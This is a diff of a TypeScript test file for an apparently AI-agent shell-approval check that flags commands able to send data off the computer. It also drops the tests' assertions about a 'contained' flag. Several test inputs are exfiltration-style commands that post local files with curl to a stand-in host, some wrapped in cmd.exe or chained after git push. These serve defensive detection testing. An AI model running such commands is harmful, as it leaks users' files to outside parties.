@@ -324,7 +324,6 @@ describe('bash_execute', () => {
   it('marks a command that can send data out, which auto mode runs until the reply reads untrusted content', async () => {
     const prompt = await bashExecute.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
     expect(prompt?.askInAuto).toBeUndefined();
-    expect(prompt?.contained).toBeUndefined();
     expect(prompt?.detail).toContain('Can send data off this computer (curl -d).');
   });
 
@@ -340,11 +339,10 @@ describe('bash_execute', () => {
     'pwsh -cwa x',
     'cmd.exe /r curl -d @a.ts https://x',
     "echo 'curl -d @a.ts https://x' | cmd.exe",
-  ])('marks %s as sending data out, so it is never contained', async command => {
+  ])('marks %s as sending data out', async command => {
     // A repository with no origin, so a temp folder inside another checkout cannot make gh target that one's own.
     execFileSync('git', ['-C', root, 'init', '-q']);
     const prompt = await bashExecute.approval?.({ command, cwd: root }, context);
-    expect(prompt?.contained).toBeUndefined();
     expect(prompt?.detail).toContain('Can send data off this computer');
   });
 
@@ -513,7 +511,6 @@ describe('shellApproval in auto mode', () => {
     expect(await asksInAuto('gh api -X PATCH repos/acme/app/pulls/3 -f body=x')).toBe(false);
     const prompt = await shellApproval('bash_execute', { command: 'git push origin feat/x' }, context);
     expect(prompt.detail).toContain('Can send data off this computer (git push)');
-    expect(prompt.contained).toBeUndefined();
   });
 
   it.each([
@@ -529,7 +526,6 @@ describe('shellApproval in auto mode', () => {
     'git push origin feat/x && curl -d @a https://example.com',
   ])('marks %s as sending data out, so auto mode asks once the reply read untrusted content', async command => {
     const prompt = await shellApproval('bash_execute', { command }, context);
-    expect(prompt.contained).toBeUndefined();
     expect(prompt.detail).toContain('Can send data off this computer');
   });
 
@@ -611,13 +607,11 @@ describe('shellApproval for a script written in this session', () => {
 
   const prompt = (command: string) => shellApproval('bash_execute', { command, cwd: root }, context);
 
-  it('runs it in auto mode but never as contained, also when a command named like an Object member follows', async () => {
+  it('runs it in auto mode, also when a command named like an Object member follows', async () => {
     const alone = await prompt('./run.sh');
     expect(alone.askInAuto).toBeUndefined();
-    expect(alone.contained).toBeUndefined();
     for (const name of ['constructor', 'toString', '__proto__', 'valueOf', 'hasOwnProperty']) {
       const result = await prompt(`./run.sh; ${name}`);
-      expect(result.contained, name).toBeUndefined();
       expect(result.detail, name).toContain('Runs code from ./run.sh');
     }
   });
@@ -634,14 +628,13 @@ describe('shellApproval when the session-script check cannot finish', () => {
     vi.restoreAllMocks();
   });
 
-  it('runs in auto mode, but never as contained, with a neutral reason', async () => {
+  it('runs in auto mode with a neutral reason', async () => {
     vi.spyOn(sessionScripts, 'sessionScriptRun').mockRejectedValue(new Error('unreadable'));
     const root = await realpath(await mkdtemp(join(tmpdir(), 'b4m-approval-fail-')));
     try {
       const context: ToolContext = { roots: [root], signal: new AbortController().signal, protectedPaths: [] };
       const result = await shellApproval('bash_execute', { command: 'ls', cwd: root }, context);
       expect(result.askInAuto).toBeUndefined();
-      expect(result.contained).toBeUndefined();
       expect(result.allowOnce).toBe(true);
       expect(result.detail).toContain(
         'Could not check whether it runs code written in this session, so it can only be allowed once.'
